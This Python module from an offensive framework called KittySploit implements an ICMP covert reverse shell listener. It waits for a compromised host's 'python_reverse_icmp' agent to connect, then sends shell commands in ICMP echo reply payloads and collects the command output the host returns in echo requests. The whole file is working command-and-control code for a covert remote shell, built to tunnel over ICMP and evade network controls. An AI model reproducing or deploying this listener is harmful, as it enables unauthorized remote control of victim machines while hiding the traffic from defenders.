#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""ICMP covert reverse shell listener (pairs with python_reverse_icmp payload)."""

import queue
import socket
import struct
import threading
import time

from kittysploit import *


class Module(Listener):
    __info__ = {
        "name": "Reverse ICMP Listener",
        "description": (
            "Receives ICMP Echo Request packets from python_reverse_icmp agents. "
            "Requires scapy and CAP_NET_RAW / Administrator. Sends commands via "
            "ICMP Echo Reply payloads (CMD:, PING, EXIT)."
        ),
        "author": ["KittySploit Team"],
        "handler": Handler.REVERSE,
        "session_type": SessionType.SHELL,
    }

    lhost = OptString("0.0.0.0", "Local IP to bind/sniff (operator interface)", True)
    sniff_timeout = OptFloat(0.5, "Sniff loop timeout seconds", False, advanced=True)

    def __init__(self, framework=None):
        super().__init__(framework)
        self.running = False
        self._cmd_queue = queue.Queue()
        self._output_queue = queue.Queue()
        self._peer_ip = None
        self._session_sock = None

    def _check_scapy(self):
        try:
            import scapy.all  # noqa: F401
            return True
        except ImportError:
            print_error("scapy required: pip install scapy")
            return False

    class _ICMPSession:
        """File-like wrapper so the framework can read/write command I/O."""

        def __init__(self, listener):
            self._listener = listener
            self._buf = b""

        def recv(self, n=4096):
            while len(self._buf) < n:
                try:
                    chunk = self._listener._output_queue.get(timeout=30)
                    self._buf += chunk.encode("utf-8", errors="replace")
                except queue.Empty:
                    break
            out = self._buf[:n]
            self._buf = self._buf[n:]
            return out or b""

        def send(self, data):
            text = data.decode("utf-8", errors="replace") if isinstance(data, bytes) else str(data)
            for line in text.splitlines():
                line = line.strip()
                if line:
                    self._listener._send_icmp(f"CMD:{line}")
            return len(data)

        def close(self):
            self._listener._send_icmp("EXIT")

    def _send_icmp(self, payload: str):
        if not self._peer_ip:
            return
        try:
            from scapy.all import IP, ICMP, Raw, send

            pkt = IP(dst=self._peer_ip) / ICMP(type=0, id=1) / Raw(load=payload.encode())
            send(pkt, verbose=0)
        except Exception as exc:
            print_warning(f"ICMP send failed: {exc}")

    def _sniff_loop(self):
        from scapy.all import ICMP, IP, Raw, sniff

        host = str(self.lhost or "0.0.0.0")
        filt = "icmp" if host in ("0.0.0.0", "") else f"icmp and dst host {host}"

        def _handle(pkt):
            if not self.running:
                return True
            if IP not in pkt or ICMP not in pkt or pkt[ICMP].type != 8:
                return False
            src = pkt[IP].src
            if self._peer_ip is None:
                self._peer_ip = src
                print_success(f"ICMP agent connected from {src}")
            if src != self._peer_ip:
                return False
            text = ""
            if Raw in pkt:
                text = pkt[Raw].load.decode("utf-8", errors="replace")
            if text.startswith("OUTPUT:"):
                self._output_queue.put(text[7:])
            elif text in ("CONNECT", "READY", "PONG"):
                pass
            return False

        while self.running:
            try:
                sniff(
                    filter=filt,
                    prn=_handle,
                    timeout=float(self.sniff_timeout or 0.5),
                    store=0,
                )
            except Exception:
                time.sleep(0.2)

    def run(self, background=False):
        if not self._check_scapy():
            return False
        self.running = True
        self._session_sock = self._ICMPSession(self)
        threading.Thread(target=self._sniff_loop, daemon=True).start()
        print_success(f"ICMP listener sniffing ({self.lhost or '0.0.0.0'})")
        print_info("Waiting for CONNECT from python_reverse_icmp payload…")
        deadline = time.time() + 120
        while self._peer_ip is None and time.time() < deadline:
            time.sleep(0.2)
        if not self._peer_ip:
            print_error("No ICMP agent connected within timeout")
            self.running = False
            return False
        return (
            self._session_sock,
            self._peer_ip,
            0,
            {"connection_type": "reverse", "protocol": "icmp"},
        )
